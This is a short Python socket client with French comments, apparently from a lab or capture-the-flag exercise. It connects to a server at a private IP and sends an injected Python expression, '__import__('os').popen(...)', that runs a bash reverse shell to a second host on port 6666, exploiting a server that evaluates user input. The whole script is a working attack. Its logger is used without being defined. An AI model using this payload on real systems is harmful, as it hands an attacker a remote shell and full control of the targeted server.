import socket
import sys
import re
import logging
# On définit la destination de la connexion
host = '10.33.66.78'  # IP du serveur
port = 13338          # Port choisir par le serveur

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    logger.info("Connexion réussie à %s:%s", host, port)
    s.send("Ok".encode())
    data = s.recv(1024)
    logger.info(f"Réponse reçue du serveur {host} : {repr(data)}")
                
    userMessage = "__import__('os').popen('bash -i >& /dev/tcp/10.33.73.77/6666 0>&1').read()"

    s.sendall(userMessage.encode("utf-8"))
    logger.info("Message envoyé au serveur %s : %s", host, userMessage)

    data = s.recv(1024)
    s.close()
    logger.info(f"Réponse reçue du serveur {host} : {repr(data)}")
    print(repr(data.decode()))
    sys.exit(0)
   # Assurez-vous que le socket est fermé même en cas d'erreur
except socket.error as e :
    logger.error("Impossible de se connecter au serveur %s sur le port %s", host, port)
    s.close()
    sys.exit(1)
# Close the connection.